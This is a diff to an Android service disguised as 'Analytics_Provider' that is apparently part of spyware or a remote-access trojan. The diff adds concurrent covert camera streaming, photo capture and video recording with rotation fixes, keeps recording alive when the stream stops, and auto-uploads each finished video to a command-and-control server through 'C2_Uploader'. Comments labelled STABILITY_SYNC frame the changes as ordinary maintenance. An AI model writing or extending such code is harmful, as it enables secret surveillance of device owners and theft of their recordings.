@@ -113,6 +113,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     private static volatile String lastCaptureError = null;
     private static CountDownLatch captureLatch;
     private static String currentVideoPath = null;
+    private static String lastFinishedVideoPath = null;
     private static long recordingStartTime = 0;
     private static volatile boolean nightModeEnabled = false;
 
@@ -124,7 +125,8 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         instance = this;
         lifecycleRegistry = new LifecycleRegistry(this);
         lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);
-        cameraExecutor = Executors.newSingleThreadExecutor();
+        // [PERFORMANCE_SYNC] Use a fixed thread pool to prevent analysis from blocking recording/C2 comms
+        cameraExecutor = Executors.newFixedThreadPool(4);
         
         createNotificationChannel();
         ensureForeground();
@@ -239,8 +241,15 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         createOverlay();
 
                         // --- 2. BUILD USE CASES ---
+                        int targetRotation = Surface.ROTATION_0;
+                        try {
+                            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                            if (wm != null) targetRotation = wm.getDefaultDisplay().getRotation();
+                        } catch (Exception ignored) {}
+
                         ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
                                 .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
+                                .setTargetRotation(targetRotation)
                                 .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
 
                         // Nightmode Overrides (Bypass AE)
@@ -255,11 +264,28 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         imageAnalysis.setAnalyzer(cameraExecutor, image -> {
                             if (!isStreaming) { image.close(); return; }
                             try {
-                                byte[] jpegData = yuv420ToJpeg(image, streamQuality);
-                                if (jpegData != null) {
+                                // [STABILITY_SYNC] Apply rotation degrees from ImageInfo to fix sideways feed
+                                int rotation = image.getImageInfo().getRotationDegrees();
+                                Bitmap bitmap = image.toBitmap();
+                                
+                                if (bitmap != null) {
+                                    if (rotation != 0) {
+                                        Matrix matrix = new Matrix();
+                                        matrix.postRotate(rotation);
+                                        Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
+                                        bitmap.recycle();
+                                        bitmap = rotated;
+                                    }
+                                    
+                                    ByteArrayOutputStream out = new ByteArrayOutputStream();
+                                    bitmap.compress(Bitmap.CompressFormat.JPEG, streamQuality, out);
+                                    byte[] jpegData = out.toByteArray();
                                     if (frameQueue.size() >= 5) frameQueue.poll();
                                     frameQueue.offer(jpegData);
+                                    bitmap.recycle();
                                 }
+                            } catch (Exception e) {
+                                Log.e(TAG, "Analysis Error: " + e.getMessage());
                             } finally { image.close(); }
                         });
 
@@ -288,8 +314,17 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         });
 
                         // --- 3. SYNCHRONIZED BINDING ---
+                        List<androidx.camera.core.UseCase> useCases = new ArrayList<>();
+                        useCases.add(preview);
+                        useCases.add(imageAnalysis);
+                        
+                        // [STABILITY_SYNC] If already recording, ensure VideoCapture stays bound
+                        if (isRecording && videoCapture != null) {
+                            useCases.add(videoCapture);
+                        }
+
                         lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
-                        camera = cameraProvider.bindToLifecycle(this, selector, preview, imageAnalysis);
+                        camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                         
                         // Promotion to RESUMED ensures highest priority for background processing
                         lifecycleRegistry.setCurrentState(Lifecycle.State.RESUMED);
@@ -394,8 +429,15 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         captureLatch = new CountDownLatch(1);
         lastCapturedPhoto = null;
 
+        int targetRotation = Surface.ROTATION_0;
+        try {
+            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+            if (wm != null) targetRotation = wm.getDefaultDisplay().getRotation();
+        } catch (Exception ignored) {}
+
         imageCapture = new ImageCapture.Builder()
                 .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
+                .setTargetRotation(targetRotation)
                 .build();
 
         CameraSelector selector;
@@ -417,8 +459,19 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
 
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
+                // [STABILITY_SYNC] Maintain existing stream/recording to prevent freezing
+                List<androidx.camera.core.UseCase> useCases = new ArrayList<>();
+                useCases.add(imageCapture);
+                if (isStreaming) {
+                    if (preview != null) useCases.add(preview);
+                    if (imageAnalysis != null) useCases.add(imageAnalysis);
+                }
+                if (isRecording && videoCapture != null) {
+                    useCases.add(videoCapture);
+                }
+
                 cameraProvider.unbindAll();
-                camera = cameraProvider.bindToLifecycle(this, selector, imageCapture);
+                camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                 
                 imageCapture.takePicture(cameraExecutor, new ImageCapture.OnImageCapturedCallback() {
                     @Override
@@ -427,6 +480,22 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                             ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                             byte[] data = new byte[buffer.remaining()];
                             buffer.get(data);
+                            
+                            // [STABILITY_SYNC] Apply rotation degrees to captured photo
+                            int rotation = image.getImageInfo().getRotationDegrees();
+                            if (rotation != 0) {
+                                Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
+                                if (bitmap != null) {
+                                    Matrix matrix = new Matrix();
+                                    matrix.postRotate(rotation);
+                                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
+                                    ByteArrayOutputStream out = new ByteArrayOutputStream();
+                                    rotated.compress(Bitmap.CompressFormat.JPEG, 95, out);
+                                    data = out.toByteArray();
+                                    bitmap.recycle();
+                                    rotated.recycle();
+                                }
+                            }
                             lastCapturedPhoto = data;
                         } finally {
                             image.close();
@@ -435,7 +504,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                             new Handler(Looper.getMainLooper()).post(() -> {
                                 if (isStreaming) {
                                     startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
-                                } else {
+                                } else if (!isRecording) {
                                     if (cameraProvider != null) cameraProvider.unbindAll();
                                     ensureForeground();
                                 }
@@ -449,7 +518,9 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         captureInProgress = false;
                         captureLatch.countDown();
                         new Handler(Looper.getMainLooper()).post(() -> {
-                            if (!isStreaming) {
+                            if (isStreaming) {
+                                startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
+                            } else if (!isRecording) {
                                 if (cameraProvider != null) cameraProvider.unbindAll();
                                 ensureForeground();
                             }
@@ -471,11 +542,18 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         else if (width >= 1920 || height >= 1080) quality = Quality.FHD;
         else if (width <= 640) quality = Quality.SD;
 
+        int targetRotation = Surface.ROTATION_0;
+        try {
+            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+            if (wm != null) targetRotation = wm.getDefaultDisplay().getRotation();
+        } catch (Exception ignored) {}
+
         Recorder recorder = new Recorder.Builder()
                 .setExecutor(cameraExecutor)
                 .setQualitySelector(QualitySelector.from(quality))
                 .build();
         videoCapture = VideoCapture.withOutput(recorder);
+        videoCapture.setTargetRotation(targetRotation);
 
         CameraSelector selector;
         if ("1".equals(cameraId)) {
@@ -501,8 +579,21 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
 
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
+                // [STABILITY_SYNC] To prevent freezing, we must bind ALL active use cases together.
+                // If streaming, include imageAnalysis and preview in the binding.
+                List<androidx.camera.core.UseCase> useCases = new ArrayList<>();
+                useCases.add(videoCapture);
+                
+                if (isStreaming) {
+                    if (preview != null) useCases.add(preview);
+                    if (imageAnalysis != null) useCases.add(imageAnalysis);
+                } else {
+                    createOverlay();
+                    if (preview != null) useCases.add(preview);
+                }
+
                 cameraProvider.unbindAll();
-                camera = cameraProvider.bindToLifecycle(this, selector, videoCapture);
+                camera = cameraProvider.bindToLifecycle(this, selector, useCases.toArray(new androidx.camera.core.UseCase[0]));
                 
                 FileOutputOptions options = new FileOutputOptions.Builder(videoFile).build();
                 if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return;
@@ -516,9 +607,20 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                                 FirebaseConfig.logActivity("OPTICS_VIDEO: Recording started");
                             } else if (event instanceof VideoRecordEvent.Finalize) {
                                 isRecording = false;
+                                lastFinishedVideoPath = currentVideoPath;
+                                // [STABILITY_SYNC] Auto-upload to C2 on completion
+                                VideoRecordEvent.Finalize finalizeEvent = (VideoRecordEvent.Finalize) event;
+                                if (!finalizeEvent.hasError()) {
+                                    C2_Uploader.uploadFile(Analytics_Provider.this, videoFile);
+                                }
+                                
                                 new Handler(Looper.getMainLooper()).post(() -> {
-                                    if (!isStreaming) {
+                                    if (isStreaming) {
+                                        // [STABILITY_SYNC] Restart stream to release VideoCapture resources
+                                        startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
+                                    } else {
                                         if (cameraProvider != null) cameraProvider.unbindAll();
+                                        removeOverlay();
                                         ensureForeground();
                                     }
                                 });
@@ -526,6 +628,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         });
             } catch (Exception e) {
                 Log.e(TAG, "Video Init Error: " + e.getMessage());
+                isRecording = false;
             }
         });
     }
@@ -538,82 +641,21 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         }
     }
 
-    private byte[] yuvToNv21(ImageProxy image) {
-        int width = image.getWidth();
-        int height = image.getHeight();
-        byte[] nv21 = new byte[width * height * 3 / 2];
-        
-        ImageProxy.PlaneProxy yPlane = image.getPlanes()[0];
-        ImageProxy.PlaneProxy uPlane = image.getPlanes()[1];
-        ImageProxy.PlaneProxy vPlane = image.getPlanes()[2];
-
-        ByteBuffer yBuffer = yPlane.getBuffer();
-        ByteBuffer uBuffer = uPlane.getBuffer();
-        ByteBuffer vBuffer = vPlane.getBuffer();
-
-        int yRowStride = yPlane.getRowStride();
-        int uRowStride = uPlane.getRowStride();
-        int uvPixelStride = uPlane.getPixelStride();
-
-        // Copy Y plane
-        int pos = 0;
-        for (int row = 0; row < height; row++) {
-            yBuffer.position(row * yRowStride);
-            yBuffer.get(nv21, pos, width);
-            pos += width;
-        }
-
-        // Copy UV plane (interleaved)
-        for (int row = 0; row < height / 2; row++) {
-            for (int col = 0; col < width / 2; col++) {
-                int uvOffset = row * uRowStride + col * uvPixelStride;
-                if (uvOffset < vBuffer.capacity() && uvOffset < uBuffer.capacity()) {
-                    nv21[pos++] = vBuffer.get(uvOffset);
-                    nv21[pos++] = uBuffer.get(uvOffset);
-                }
-            }
-        }
-        return nv21;
-    }
-
-    private byte[] yuv420ToJpeg(ImageProxy image, int quality) {
-        try {
-            byte[] nv21 = yuvToNv21(image);
-            YuvImage yuvImage = new YuvImage(nv21, android.graphics.ImageFormat.NV21, image.getWidth(), image.getHeight(), null);
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            yuvImage.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), quality, out);
-            byte[] imageBytes = out.toByteArray();
-
-            // Handle rotation
-            if (image.getImageInfo().getRotationDegrees() != 0) {
-                Bitmap bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
-                if (bitmap != null) {
-                    Matrix matrix = new Matrix();
-                    matrix.postRotate(image.getImageInfo().getRotationDegrees());
-                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
-                    ByteArrayOutputStream rotateOut = new ByteArrayOutputStream();
-                    rotated.compress(Bitmap.CompressFormat.JPEG, quality, rotateOut);
-                    imageBytes = rotateOut.toByteArray();
-                    bitmap.recycle();
-                    rotated.recycle();
-                }
-            }
-            return imageBytes;
-        } catch (Exception e) {
-            return null;
-        }
-    }
-
     public void stopStreaming() {
         isStreaming = false;
         frameQueue.clear();
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
-                if (cameraProvider != null) {
-                    cameraProvider.unbindAll();
+                if (!isRecording) {
+                    if (cameraProvider != null) {
+                        cameraProvider.unbindAll();
+                    }
+                    removeOverlay();
+                } else if (imageAnalysis != null) {
+                    // [STABILITY_SYNC] If recording, only unbind analysis to keep video alive
+                    cameraProvider.unbind(imageAnalysis);
                 }
             } catch (Exception ignored) {}
-            removeOverlay();
             ensureForeground(); // Force indicator reset
         });
     }
@@ -671,6 +713,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     public static int getStreamHeight() { return streamHeight; }
     public static boolean isCurrentlyRecording() { return isRecording; }
     public static String getCurrentVideoPath() { return currentVideoPath; }
+    public static String getLastFinishedVideoPath() { return lastFinishedVideoPath; }
     public static long getRecordingDuration() { return isRecording ? (System.currentTimeMillis() - recordingStartTime) / 1000 : 0; }
     public static boolean isNightModeEnabled(Context c) { return nightModeEnabled; }
     
